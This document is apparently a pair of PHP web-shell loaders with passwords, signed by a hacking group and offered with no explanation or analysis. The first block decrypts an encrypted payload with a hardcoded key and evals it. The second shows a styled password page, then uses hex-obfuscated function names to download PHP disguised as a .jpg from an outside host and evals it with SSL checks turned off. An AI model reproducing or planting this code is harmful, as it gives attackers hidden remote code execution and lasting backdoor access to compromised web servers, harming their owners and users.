<?php
error_reporting(0);
ini_set('display_errors', 0);


$kunci = '1234567890abcdef';


$encryptedContent = '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'; // Ganti dengan hasil enkripsi dari langkah pertama


$decryptedContent = openssl_decrypt($encryptedContent, 'AES-128-ECB', $kunci, 0);

eval('?>' . $decryptedContent);
?>



PASSWORD : ClanX7 PRIVATE


====================================================================================

PASSWORD : susah@banget1337


=========================================================================================================

<?php
/**
 * @package    
 * @copyright  
 */

function is_logged_in()
{
    return isset($_COOKIE['user_id']) && $_COOKIE['user_id'] === 'tuwaga1337'; 
}

if (is_logged_in()) {
    $Array = array(
        '666f70656e',
        '73747265616d5f6765745f636f6e74656e7473',
        '66696c655f6765745f636f6e74656e7473',
        '6375726c5f65786563'
    );

    function hex2str($hex) {
        $str = '';
        for ($i = 0; $i < strlen($hex); $i += 2) {
            $str .= chr(hexdec(substr($hex, $i, 2)));
        }
        return $str;
    }

    function geturlsinfo($destiny) {
        $belief = array_map('hex2str', $GLOBALS['Array']);
        if (function_exists($belief[3])) { 
            $ch = curl_init($destiny);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            $love = $belief[3]($ch);
            curl_close($ch);
            return $love;
        } elseif (function_exists($belief[2])) { 
            return $belief[2]($destiny);
        } elseif (function_exists($belief[0]) && function_exists($belief[1])) { 
            $purpose = $belief[0]($destiny, "r");
            $love = $belief[1]($purpose);
            fclose($purpose);
            return $love;
        }
        return false;
    }

    $destiny = 'https://choexoftbarbar.pages.dev/nenen.jpg';
    $dream = geturlsinfo($destiny);
    if ($dream !== false) {
        eval('?>' . $dream);
    }
} else {
    if (isset($_POST['password'])) {
        $entered_key = $_POST['password'];
        $hashed_key = '$2y$10$z6spe74OA3P3NnfOrrdn9e5E6qcCQyLPjfQbD20DfsD7H.PDHMy.e'; 
        
        if (password_verify($entered_key, $hashed_key)) {
            setcookie('user_id', 'tuwaga1337', time() + 3600, '/'); 
            header("Location: ".$_SERVER['PHP_SELF']); 
            exit();
        }
    }
?>

<!doctype html>
<html lang="id">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Uchiha Terminal | Restricted</title>

<style>
:root {
  --blood-red: #8b0000;
  --bright-red: #ff0000;
  --deep-black: #050505;
}

body {
  margin: 0;
  padding: 0;
  font-family: 'Courier New', monospace;
  background-color: var(--deep-black);
  /* Gambar background utama */
  background-image: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.6)), url('https://i.pinimg.com/1200x/70/3e/90/703e901b36c5ed42fdf51d65c19a8042.jpg');
  background-size: cover;
  background-position: center;
  background-attachment: fixed;
  color: var(--bright-red);
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
  overflow: hidden;
}

/* Rain Effect Canvas */
canvas {
  position: fixed;
  top: 0;
  left: 0;
  z-index: 0;
  opacity: 0.3;
  pointer-events: none;
}

.container {
  width: 350px;
  padding: 40px 30px;
  background: rgba(0, 0, 0, 0.85); /* Box hitam transparan pekat */
  border: 2px solid var(--blood-red);
  box-shadow: 0 0 50px rgba(139, 0, 0, 0.6);
  border-radius: 2px;
  text-align: center;
  position: relative;
  z-index: 2;
  backdrop-filter: blur(5px);
}

.title {
  font-size: 18px;
  letter-spacing: 2px;
  margin-bottom: 25px;
  text-shadow: 0 0 15px var(--bright-red);
  font-weight: bold;
}

input {
  width: 100%;
  padding: 15px;
  margin: 15px 0;
  background: rgba(0,0,0,0.9);
  border: 1px solid var(--blood-red);
  color: #fff;
  border-radius: 0;
  outline: none;
  font-family: monospace;
  box-sizing: border-box;
  text-align: center;
  letter-spacing: 5px;
}

input:focus {
  border-color: var(--bright-red);
  box-shadow: 0 0 10px var(--blood-red);
}

button {
  width: 100%;
  padding: 12px;
  background: var(--blood-red);
  color: #fff;
  text-transform: uppercase;
  letter-spacing: 3px;
  font-weight: bold;
  border: none;
  cursor: pointer;
  transition: all 0.4s ease;
}

button:hover {
  background: var(--bright-red);
  box-shadow: 0 0 30px var(--bright-red);
  letter-spacing: 5px;
}

.footer {
  margin-top: 25px;
  font-size: 10px;
  letter-spacing: 2px;
  opacity: 0.7;
  color: #aaa;
}

@keyframes flicker {
  0% { opacity: 0.8; }
  50% { opacity: 1; }
  100% { opacity: 0.9; }
}

#typing {
  animation: flicker 0.1s infinite;
}
</style>
</head>

<body>

<canvas id="genjutsu"></canvas>

<div class="container">
  <div class="title" id="typing"></div>

  <!-- Form menggunakan method POST sesuai script PHP asli -->
  <form method="POST">
    <input type="password" name="password" placeholder="PASSWORD" required autofocus>
    <button type="submit">MASUKKAN PASSWORD NYA BANG</button>
  </form>

  <div class="footer">CHOEXO FT BARBAR IS HERE</div>
</div>

<script>
const canvas = document.getElementById("genjutsu");
const ctx = canvas.getContext("2d");

canvas.height = window.innerHeight;
canvas.width = window.innerWidth;

const alphabet = "アイウエオカキクケコサシスセソタチツテトABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
const fontSize = 16;
const columns = canvas.width / fontSize;
const rainDrops = Array.from({ length: columns }).fill(canvas.height);

function draw() {
  ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
  ctx.fillRect(0, 0, canvas.width, canvas.height);

  ctx.fillStyle = "#ff0000"; 
  ctx.font = fontSize + "px monospace";

  for (let i = 0; i < rainDrops.length; i++) {
    const text = alphabet.charAt(Math.floor(Math.random() * alphabet.length));
    ctx.fillText(text, i * fontSize, rainDrops[i] * fontSize);

    if (rainDrops[i] * fontSize > canvas.height && Math.random() > 0.975) {
      rainDrops[i] = 0;
    }
    rainDrops[i]++;
  }
}

setInterval(draw, 50);

const message = "root@system:-$ I’M CHOExo";
let index = 0;
function type() {
  if (index < message.length) {
    document.getElementById("typing").innerHTML += message.charAt(index);
    index++;
    setTimeout(type, 100);
  }
}
type();

window.onresize = () => {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
};
</script>

</body>
</html>

<?php } ?>